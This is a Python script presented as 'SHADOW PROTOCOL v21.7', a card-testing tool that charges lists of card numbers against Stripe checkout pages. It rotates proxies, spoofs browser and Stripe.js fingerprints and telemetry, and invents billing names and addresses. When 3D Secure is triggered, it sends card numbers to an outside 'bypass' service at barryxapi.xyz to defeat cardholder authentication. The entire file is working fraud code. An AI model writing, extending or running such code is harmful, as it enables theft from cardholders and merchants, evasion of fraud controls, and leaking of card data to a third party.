"""
?? SHADOW PROTOCOL v21.7: BarryX API 3DS Bypass Integration
Tokenization-first checkout with external 3DS2 bypass via barryxapi.xyz.
Clean output format with 3DS status and receipt URL.
"""

import re
import json
import time
import random
import asyncio
import uuid
import base64
import urllib.parse
import os
from datetime import datetime
from typing import Dict, List, Optional
from pathlib import Path

from curl_cffi import requests as cffi_requests
import requests  # for the bypass API call

# ============= CONFIG =============
MAX_ATTEMPTS = 20
SESSION_REFRESH_EVERY = 3
CARD_INTERVAL_SECONDS = 1.0

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
]

# ============= STRIPE.JS v3 CONSTANTS =============
STRIPE_JS_VERSION = "5507c504c1"
STRIPE_API_VERSION = "2024-06-20"
STRIPE_JS_BASE = "https://api.stripe.com/v1"
PAYMENT_USER_AGENT = f"stripe.js/{STRIPE_JS_VERSION}; stripe-js-v3/{STRIPE_JS_VERSION}; checkout"

INTEGRATION_SIGNATURE = {
    "integration": "elements",
    "integration_type": "elements",
    "integration_version": STRIPE_JS_VERSION,
}

FIRST_NAMES = ['John', 'Jane', 'Alex', 'Chris', 'Sam', 'Taylor', 'Jordan', 'Logan']
LAST_NAMES = ['Smith', 'Doe', 'Brown', 'Miller', 'Wilson', 'Davis', 'Moore', 'Taylor']

ADDRESSES = [
    {'street': '3501 S Main St', 'city': 'Gainesville', 'state': 'FL', 'zip': '32601'},
    {'street': '3501 Main St', 'city': 'Frederica', 'state': 'DE', 'zip': '19946'},
]

# ============= COLORS =============
class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
    M = "\033[95m"; C = "\033[96m"; W = "\033[97m"; BOLD = "\033[1m"; RESET = "\033[0m"

def log(msg, level="INFO"):
    colors = {"INFO": C.W, "SUCCESS": C.G, "WARN": C.Y, "ERROR": C.R, "DEBUG": C.C, "STEP": C.M}
    prefixes = {"INFO": "[?]", "SUCCESS": "[?]", "WARN": "[?]", "ERROR": "[?]", "DEBUG": "[?]", "STEP": "[?]"}
    print(f"{colors.get(level, C.W)}{prefixes.get(level, '[?]')} {msg}{C.RESET}")

def parse_cards(filepath):
    cards = []
    path = Path(filepath)
    if not path.exists(): log(f"File not found: {filepath}", "ERROR"); return cards
    content = path.read_text().strip()
    for line in content.split("\n"):
        line = line.strip()
        if not line or line.startswith("#"): continue
        if "|" in line:
            parts = line.split("|")
            if len(parts) >= 4:
                cards.append({"card": parts[0].strip().replace(" ", ""), "month": parts[1].strip().zfill(2),
                              "year": parts[2].strip()[-2:], "cvv": parts[3].strip()})
        elif ":" in line:
            parts = line.split(":")
            if len(parts) >= 4:
                cards.append({"card": parts[0].strip().replace(" ", ""), "month": parts[1].strip().zfill(2),
                              "year": parts[2].strip()[-2:], "cvv": parts[3].strip()})
        else:
            parts = line.split()
            if len(parts) >= 4 and parts[0].isdigit() and len(parts[0]) >= 15:
                cards.append({"card": parts[0].strip(), "month": parts[1].strip().zfill(2),
                              "year": parts[2].strip()[-2:], "cvv": parts[3].strip()})
    return cards

def random_hex(length): return ''.join(random.choice('abcdef0123456789') for _ in range(length))
def random_ua(): return random.choice(USER_AGENTS)
def get_proxy():
    pf = Path("proxies.txt")
    if pf.exists():
        proxies = [l.strip() for l in pf.read_text().split("\n") if l.strip() and not l.startswith("#")]
        if proxies: return random.choice(proxies)
    return None

def build_stripe_js_headers(ua, pk_key, origin_url, referer_url, extra=None):
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": origin_url,
        "referer": referer_url,
        "user-agent": ua,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "x-requested-with": "XMLHttpRequest",
        "x-stripe-integration": INTEGRATION_SIGNATURE["integration"],
        "x-stripe-integration-type": INTEGRATION_SIGNATURE["integration_type"],
        "x-stripe-integration-version": INTEGRATION_SIGNATURE["integration_version"],
        "x-stripe-payment-user-agent": PAYMENT_USER_AGENT,
        "x-stripe-client-user-agent": json.dumps({
            "lang": "en-US",
            "browser": "Chrome",
            "browser_version": "145.0.0.0",
            "os": "Windows",
            "os_version": "10",
            "device_type": "desktop",
        }),
        "stripe-version": STRIPE_API_VERSION,
    }
    if extra:
        headers.update(extra)
    return headers

def extract_session(checkout_url):
    log("Fetching checkout page...", "STEP")
    session = cffi_requests.Session(impersonate="chrome124")
    try:
        ua = random_ua()
        headers = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Upgrade-Insecure-Requests": "1",
        }
        resp = session.get(checkout_url, headers=headers, timeout=15, allow_redirects=True)
        final_url, html = str(resp.url), resp.text
        
        cs = None
        for p in [r'/c/pay/(cs_[a-z]+_[a-zA-Z0-9]+)', r'cs_[a-z]+_[a-zA-Z0-9]+']:
            m = re.search(p, final_url)
            if m: cs = m.group(1) if '(' in p else m.group(0); break
        if not cs:
            m = re.search(r'cs_[a-z]+_[a-zA-Z0-9]+', html)
            if m: cs = m.group(0)
        if not cs: return None,None,None,None,None
        
        log(f"CS: {cs[:40]}...", "SUCCESS")
        
        pk = None
        hi = final_url.find('#')
        if hi != -1:
            try:
                d = urllib.parse.unquote(final_url[hi+1:])
                rb = base64.b64decode(d+'==')
                js = ''.join(chr(b^5) for b in rb)
                pk = json.loads(js).get('apiKey')
            except: pass
        if not pk:
            allk = re.findall(r'pk_[a-z]+_[a-zA-Z0-9]+', html)
            lk = [k for k in allk if k.startswith('pk_live_')]; tk = [k for k in allk if k.startswith('pk_test_')]
            pk = (lk or tk or [None])[0]
        if not pk:
            for p in [r'"publishableKey"\s*:\s*"([^"]+)"', r'publishableKey:\s*"([^"]+)"']:
                m = re.search(p, html)
                if m: pk = m.group(1); break
        if not pk: return cs,None,None,None,None
        
        log(f"PK: {pk[:30]}...", "SUCCESS")
        
        amount = None; merchant = "Unknown"; email = None
        try:
            ar = session.post(
                f"{STRIPE_JS_BASE}/payment_pages/{cs}/init",
                headers=build_stripe_js_headers(ua, pk, "https://checkout.stripe.com", "https://checkout.stripe.com/"),
                data={"key": pk, "eid": "NA", "browser_locale": "en-US", "redirect_type": "url"},
                timeout=10
            )
            if ar.status_code == 200:
                j = ar.json()
                inv = j.get('invoice')
                if isinstance(inv, dict): amount = inv.get('amount_due') or inv.get('total')
                if not amount:
                    ts = j.get('total_summary')
                    if isinstance(ts, dict): amount = ts.get('due') or ts.get('total')
                if not amount:
                    lig = j.get('line_item_group')
                    if isinstance(lig, dict):
                        amount = lig.get('total')
                        if not amount and lig.get('line_items'):
                            li = lig['line_items']
                            if isinstance(li, list) and li: amount = li[0].get('total')
                if not amount: amount = j.get('amount')
                acct = j.get('account_settings')
                if isinstance(acct, dict): merchant = acct.get('display_name', merchant)
                email = j.get('customer_email') or j.get('prefilled_email')
                log(f"Merchant: {merchant}", "INFO")
                log(f"Amount: ${amount/100:.2f}" if amount else "Amount: ?", "INFO")
        except Exception as e:
            log(f"Init extract exception (non-fatal): {e}", "DEBUG")
        
        return cs, pk, amount or 0, merchant, email
    except Exception as e:
        log(f"Extract failed: {e}", "ERROR")
        return None,None,0,None,None
    finally:
        session.close()

def refresh_session(url):
    session = cffi_requests.Session(impersonate="chrome124")
    try:
        headers = {
            "User-Agent": random_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none", "Upgrade-Insecure-Requests": "1",
        }
        resp = session.get(url, headers=headers, timeout=15, allow_redirects=True)
        final_url, html = str(resp.url), resp.text
        cs = None
        for p in [r'/c/pay/(cs_[a-z]+_[a-zA-Z0-9]+)', r'cs_[a-z]+_[a-zA-Z0-9]+']:
            m = re.search(p, final_url)
            if m: cs = m.group(1) if '(' in p else m.group(0); break
        if not cs:
            m = re.search(r'cs_[a-z]+_[a-zA-Z0-9]+', html)
            if m: cs = m.group(0)
        return cs
    except:
        return None
    finally:
        session.close()

# =====================================================================
# ?? 3DS BYPASS via barryxapi.xyz
# =====================================================================

def bypass_3ds_barryxapi(payatt_id, pk_live, card_number):
    """
    Use the barryxapi.xyz service to perform the 3DS2 authentication.
    Returns True if the API returns 'succeeded', 'completed', or 'processing_error'.
    """
    url = "https://api.barryxapi.xyz/v1/3ds2/authenticate"
    
    payload = {
       "key": "BRY-KPLMN-QWSXV-THDG8",
        "source": payatt_id,
        "pk": pk_live,
        "card": card_number
    }
    
    try:
        resp = requests.post(url, json=payload, timeout=20)
        data = resp.json()
        
        state = data.get('state', '')
        if state in ('succeeded', 'completed', 'processing_error'):
            return True, state
        else:
            return False, state
    except Exception as e:
        return False, str(e)

def handle_3ds_bypass(payment_intent, pk_live, ua, session, cs_token, card_dict):
    """
    3DS bypass handler – extracts payatt_id and calls the BarryX API.
    Returns: (updated_pi, bypass_success, three_ds_status)
    """
    pi_id = payment_intent.get('id')
    client_secret = payment_intent.get('client_secret')
    
    if not pi_id or not client_secret:
        log("Missing pi_id or client_secret for 3DS bypass", "ERROR")
        return payment_intent, False, "FAILED ❌"
    
    next_action = payment_intent.get('next_action', {})
    use_stripe_sdk = next_action.get('use_stripe_sdk', {})
    
    # Extract the 3DS source
    payatt_id = (
        use_stripe_sdk.get('three_d_secure_2_source') or
        use_stripe_sdk.get('source') or
        (next_action.get('redirect_to_url', {}).get('url', '').split('source=')[-1].split('&')[0]
         if 'source=' in next_action.get('redirect_to_url', {}).get('url', '') else None)
    )
    
    if not payatt_id:
        log("Could not extract 3DS source from next_action", "ERROR")
        return payment_intent, False, "FAILED ❌"
    
    log(f"3DS source: {payatt_id[:30]}...", "DEBUG")
    
    # Call the external bypass API
    bypass_ok, state = bypass_3ds_barryxapi(payatt_id, pk_live, card_dict['card'])
    
    if bypass_ok:
        three_ds_status = "BYPASSED ✅"
    else:
        three_ds_status = "FAILED ❌"
    
    # Small delay then check the payment intent status
    time.sleep(2)
    
    try:
        cv_headers = build_stripe_js_headers(
            ua, pk_live,
            "https://checkout.stripe.com",
            f"https://checkout.stripe.com/c/pay/{cs_token}"
        )
        cv_resp = session.get(
            f"{STRIPE_JS_BASE}/payment_intents/{pi_id}?key={pk_live}&is_stripe_sdk=false&client_secret={client_secret}",
            headers=cv_headers,
            timeout=10
        )
        updated_pi = cv_resp.json()
    except Exception as e:
        log(f"PI status check error: {e}", "DEBUG")
        updated_pi = payment_intent
    
    new_status = updated_pi.get('status', 'unknown')
    log(f"Status after BarryX bypass: {new_status}", "DEBUG")
    
    # If bypass API reported success or PI status is now positive, we're good
    if new_status in ('succeeded', 'requires_capture'):
        bypass_ok = True
        if three_ds_status == "FAILED ❌":
            three_ds_status = "BYPASSED ✅"
    
    return updated_pi, bypass_ok, three_ds_status

# =====================================================================
# Tokenization & Card Processing
# =====================================================================

def create_payment_method(session, card, pk_key, ua, billing_email, billing_name, addr):
    """Tokenize card via official Stripe.js v3 /payment_methods endpoint."""
    cc, mm, yy, cvv = card['card'], card['month'], card['year'], card['cvv']
    
    tokenize_headers = build_stripe_js_headers(
        ua, pk_key,
        "https://js.stripe.com",
        "https://js.stripe.com/",
        extra={
            "sec-fetch-site": "same-site",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
        }
    )
    
    tokenize_data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "billing_details[name]": billing_name,
        "billing_details[email]": billing_email,
        "billing_details[address][line1]": addr['street'],
        "billing_details[address][city]": addr['city'],
        "billing_details[address][state]": addr['state'],
        "billing_details[address][postal_code]": addr['zip'],
        "billing_details[address][country]": "US",
        "key": pk_key,
        "payment_user_agent": PAYMENT_USER_AGENT,
    }
    
    try:
        resp = session.post(
            f"{STRIPE_JS_BASE}/payment_methods",
            headers=tokenize_headers,
            data=tokenize_data,
            timeout=20
        )
        result = resp.json()
        
        if resp.status_code == 200 and result.get('id', '').startswith('pm_'):
            pm_id = result['id']
            log(f"?? Tokenized: {pm_id}", "SUCCESS")
            return pm_id
        else:
            error = result.get('error', {})
            decline_code = error.get('decline_code') or error.get('code', 'tokenization_failed')
            error_msg = error.get('message', 'Unknown tokenization error')
            log(f"? Tokenization failed: {decline_code} - {error_msg[:150]}", "ERROR")
            return None
    except Exception as e:
        log(f"? Tokenization exception: {e}", "ERROR")
        return None

def hit_card(card, cs_token, pk_key, raw_amount, locked_email, proxy_url=None):
    start = time.time()
    card_last4 = card['card'][-4:]
    result = {
        "success": False,
        "decline_code": None,
        "error": None,
        "response_time": 0,
        "receipt_url": None,
        "card_last4": card_last4,
        "three_ds_status": "NOT REQUIRED ⚪",
        "final_response": "",
    }
    
    ua = random_ua()
    is_pi = cs_token.startswith('pi_')
    is_seti = cs_token.startswith('seti_')
    
    if is_pi or is_seti:
        checkout_url = f"https://invoice.stripe.com/i/{cs_token}"
        origin_url = "https://invoice.stripe.com"
    else:
        checkout_url = f"https://checkout.stripe.com/c/pay/{cs_token}"
        origin_url = "https://checkout.stripe.com"
    
    expected_amount = raw_amount if raw_amount and raw_amount > 0 else 0
    fname = random.choice(FIRST_NAMES)
    lname = random.choice(LAST_NAMES)
    billing_name = f"{fname} {lname}"
    email = locked_email or f"{fname.lower()}.{lname.lower()}{random.randint(1000,9999)}@gmail.com"
    addr = random.choice(ADDRESSES)
    
    try:
        session = cffi_requests.Session(impersonate="chrome124")
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
        session.cookies.set("__stripe_mid", str(uuid.uuid4()))
        session.cookies.set("cid", str(uuid.uuid4()))
        
        # Warmup visit
        try:
            session.get(checkout_url, headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "user-agent": ua,
            }, timeout=15)
        except:
            pass
        
        # Telemetry
        muid = str(uuid.uuid4())
        try:
            session.post(
                "https://m.stripe.com/6",
                headers={
                    "content-type": "application/json",
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "user-agent": ua,
                },
                json={
                    "v": 2,
                    "tag": f"5.6.8_js_fp_{STRIPE_JS_VERSION}",
                    "src": "checkout-inner-live-v3",
                    "a": {
                        "a": pk_key, "b": checkout_url, "c": 24, "d": "1920x1080",
                        "e": False, "f": "en-US", "g": "Win32", "h": ua,
                        "i": -300, "j": False, "k": 8, "l": 8, "m": "", "n": "", "o": "",
                    },
                },
                timeout=10,
            )
        except:
            pass
        
        # Tokenize card
        pm_id = create_payment_method(session, card, pk_key, ua, email, billing_name, addr)
        
        if not pm_id:
            result['decline_code'] = 'tokenization_failed'
            result['error'] = 'Failed to create payment method token'
            result['response_time'] = time.time() - start
            result['final_response'] = f"tokenization_failed - Failed to create payment method token"
            session.close()
            return result
        
        # Confirm with PM token
        confirm_headers = build_stripe_js_headers(ua, pk_key, origin_url, checkout_url)
        
        if is_pi:
            pi_id = cs_token.split('_secret_')[0]
            confirm_url = f"{STRIPE_JS_BASE}/payment_intents/{pi_id}/confirm"
            confirm_data = {
                "payment_method": pm_id,
                "expected_payment_method_type": "card",
                "use_stripe_sdk": "true",
                "return_url": checkout_url,
                "key": pk_key,
                "client_secret": cs_token,
                "payment_user_agent": PAYMENT_USER_AGENT,
            }
            if expected_amount > 0:
                confirm_data["expected_amount"] = str(expected_amount)
        
        elif is_seti:
            seti_id = cs_token.split('_secret_')[0]
            confirm_url = f"{STRIPE_JS_BASE}/setup_intents/{seti_id}/confirm"
            confirm_data = {
                "payment_method": pm_id,
                "expected_payment_method_type": "card",
                "use_stripe_sdk": "true",
                "return_url": checkout_url,
                "key": pk_key,
                "client_secret": cs_token,
                "payment_user_agent": PAYMENT_USER_AGENT,
            }
        
        else:
            confirm_url = f"{STRIPE_JS_BASE}/payment_pages/{cs_token}/confirm"
            confirm_data = {
                "payment_method": pm_id,
                "expected_payment_method_type": "card",
                "consent[terms_of_service]": "accepted",
                "key": pk_key,
                "payment_user_agent": PAYMENT_USER_AGENT,
            }
            if expected_amount > 0:
                confirm_data["expected_amount"] = str(expected_amount)
        
        confirm_resp = session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30)
        confirm_json = confirm_resp.json()
        result['response_time'] = time.time() - start
        
        err_code = confirm_json.get('error', {}).get('code', '')
        err_msg = confirm_json.get('error', {}).get('message', '')
        
        # Handle amount mismatch
        if err_code == 'checkout_amount_mismatch':
            m = re.search(r'actual amount \((\d+)\)', err_msg.lower())
            if m:
                confirm_data["expected_amount"] = str(int(m.group(1)))
                confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                confirm_resp = session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30)
                confirm_json = confirm_resp.json()
        
        # Handle unknown parameter errors
        _pr = 0
        err_code = confirm_json.get('error', {}).get('code', '')
        while confirm_resp.status_code == 400 and err_code == 'parameter_unknown' and _pr < 5:
            pm = re.search(r'unknown parameter[:\s]+([^\s\.\,]+)', err_msg, re.I)
            removed = False
            if pm:
                bp = pm.group(1).strip("'\"")
                for k in list(confirm_data.keys()):
                    if bp in k and k not in ['payment_method', 'expected_payment_method_type', 'key', 'client_secret']:
                        del confirm_data[k]
                        removed = True
            if not removed:
                for fb in ['use_stripe_sdk', 'return_url', 'expected_amount',
                           'consent[terms_of_service]', 'payment_user_agent']:
                    if fb in confirm_data:
                        del confirm_data[fb]
                        removed = True
                        break
            if not removed:
                break
            confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
            confirm_resp = session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30)
            confirm_json = confirm_resp.json()
            err_code = confirm_json.get('error', {}).get('code', '')
            _pr += 1
        
        # ============ PARSE RESULT ============
        if confirm_resp.status_code == 200 and 'error' not in confirm_json:
            status = confirm_json.get('status')
            pi = confirm_json.get('payment_intent', {})
            if isinstance(pi, dict):
                if pi.get('status'): status = pi.get('status')
                if pi.get('last_payment_error'):
                    err = pi['last_payment_error']
                    result['decline_code'] = err.get('decline_code', 'error')
                    result['error'] = err.get('message', '')
                    result['final_response'] = f"{result['decline_code']} - {result['error']}"
                    session.close()
                    return result
            
            log(f"Status: {status}", "DEBUG")
            
            if status in ('succeeded', 'requires_capture', 'complete'):
                result['success'] = True
                result['three_ds_status'] = "NOT REQUIRED ⚪"
                charges = (pi if isinstance(pi, dict) else confirm_json).get('charges', {}).get('data', [])
                if charges:
                    result['receipt_url'] = charges[0].get('receipt_url', '')
                result['final_response'] = f"succeeded - Payment complete"
            
            elif status in ('requires_action', 'requires_source_action'):
                # 3DS bypass
                updated_pi, bypass_success, three_ds_status = handle_3ds_bypass(
                    pi if isinstance(pi, dict) and pi else confirm_json,
                    pk_key, ua, session, cs_token, card
                )
                
                result['three_ds_status'] = three_ds_status
                final_status = updated_pi.get('status', status)
                
                if final_status in ('succeeded', 'requires_capture'):
                    result['success'] = True
                    charges = updated_pi.get('charges', {}).get('data', [])
                    if charges:
                        result['receipt_url'] = charges[0].get('receipt_url', '')
                    result['final_response'] = f"succeeded - Payment complete"
                elif updated_pi.get('last_payment_error'):
                    err = updated_pi['last_payment_error']
                    result['decline_code'] = err.get('decline_code', '3ds_failed')
                    result['error'] = err.get('message', '3DS bypass failed')
                    result['final_response'] = f"{result['decline_code']} - {result['error']}"
                else:
                    result['decline_code'] = '3ds_failed'
                    result['error'] = f'3DS bypass failed. Final status: {final_status}'
                    result['final_response'] = f"{result['decline_code']} - {result['error']}"
            
            elif status == 'requires_payment_method':
                result['decline_code'] = 'generic_decline'
                result['error'] = 'Card declined'
                result['final_response'] = f"generic_decline - Card declined"
            else:
                result['decline_code'] = status or 'unknown'
                result['error'] = f'Status: {status}'
                result['final_response'] = f"{result['decline_code']} - {result['error']}"
        else:
            err = confirm_json.get('error', {})
            result['decline_code'] = err.get('decline_code') or err.get('code', 'unknown')
            result['error'] = err.get('message', 'Unknown error')
            result['final_response'] = f"{result['decline_code']} - {result['error']}"
        
        session.close()
    except Exception as e:
        result['decline_code'] = 'exception'
        result['error'] = str(e)
        result['response_time'] = time.time() - start
        result['final_response'] = f"exception - {str(e)}"
    
    return result

async def process_cards(checkout_url, cards):
    log("=" * 60, "STEP")
    log("PHASE 1: EXTRACTING CHECKOUT SESSION", "STEP")
    log("=" * 60, "STEP")
    
    cs_token, pk_key, raw_amount, merchant, locked_email = extract_session(checkout_url)
    if not cs_token or not pk_key:
        return
    
    log("=" * 60, "STEP")
    log(f"PHASE 2: PROCESSING {min(len(cards), MAX_ATTEMPTS)} CARDS", "STEP")
    log("=" * 60, "STEP")
    
    successes, fails, current_cs = 0, 0, cs_token
    
    for i, card in enumerate(cards[:MAX_ATTEMPTS]):
        log(f"\n{'=' * 40}", "STEP")
        log(f"CARD {i+1}/{min(len(cards), MAX_ATTEMPTS)}: {card['card'][:6]}...{card['card'][-4:]}", "STEP")
        log(f"{'=' * 40}", "STEP")
        
        if i > 0 and i % SESSION_REFRESH_EVERY == 0:
            nc = refresh_session(checkout_url)
            if nc:
                current_cs = nc
                cs_token, pk_key, raw_amount, merchant, locked_email = extract_session(checkout_url)
        
        proxy_url = get_proxy()
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, hit_card, card, current_cs, pk_key, raw_amount, locked_email, proxy_url)
        
        # ============ CLEAN OUTPUT ============
        receipt_display = result.get('receipt_url', 'N/A') if result.get('receipt_url') else 'N/A'
        
        print(f"""
{C.BOLD}═══════════════════════════════════════════════════════════════{C.RESET}
  {C.BOLD}MERCHANT:{C.RESET} {merchant}
  {C.BOLD}AMOUNT:{C.RESET} ${raw_amount/100:.2f}
  {C.BOLD}3DS STATUS:{C.RESET} {result.get('three_ds_status', 'NOT REQUIRED ⚪')}
  {C.BOLD}RESPONSE:{C.RESET} {result.get('final_response', 'unknown')}
  {C.BOLD}RECEIPT:{C.RESET} {receipt_display}
{C.BOLD}═══════════════════════════════════════════════════════════════{C.RESET}
""")
        
        if result['success']:
            successes += 1
        else:
            fails += 1
        
        # Fixed 1 second interval between cards
        if i < len(cards[:MAX_ATTEMPTS]) - 1:
            await asyncio.sleep(CARD_INTERVAL_SECONDS)
    
    log("\n" + "=" * 60, "STEP")
    log("FINAL SUMMARY", "STEP")
    log("=" * 60, "STEP")
    log(f"?? Charged: {successes}", "SUCCESS")
    log(f"? Declined: {fails}", "ERROR")

async def main():
    print(f"\n{C.M}{C.BOLD}  ?? ???Sahdow ?? Stripe v21.7 - BarryX API 3DS Bypass{C.RESET}\n")
    checkout_url = input(f"{C.C}[?] Checkout URL: {C.RESET}").strip()
    if not checkout_url.startswith("http"):
        log("Invalid URL", "ERROR")
        return
    
    card_file = input(f"{C.C}[?] Card file [cards.txt]: {C.RESET}").strip() or "cards.txt"
    if not Path(card_file).exists():
        Path(card_file).write_text("4242424242424242|12|26|123\n")
        log(f"Created {card_file} with test card", "INFO")
        return
    
    cards = parse_cards(card_file)
    if not cards:
        log("No valid cards", "ERROR")
        return
    
    log(f"Loaded {len(cards)} cards", "INFO")
    print(f"\n{C.BOLD}Ready:{C.RESET}\n  URL: {checkout_url[:80]}...\n  Cards: {len(cards)}\n  Interval: {CARD_INTERVAL_SECONDS}s")
    
    if input(f"\n{C.Y}[?] Proceed? [Y/n]: {C.RESET}").strip().lower() == 'n':
        return
    
    await process_cards(checkout_url, cards)
    print(f"\n{C.G}{C.BOLD}Done.{C.RESET}")

if __name__ == "__main__":
    asyncio.run(main())
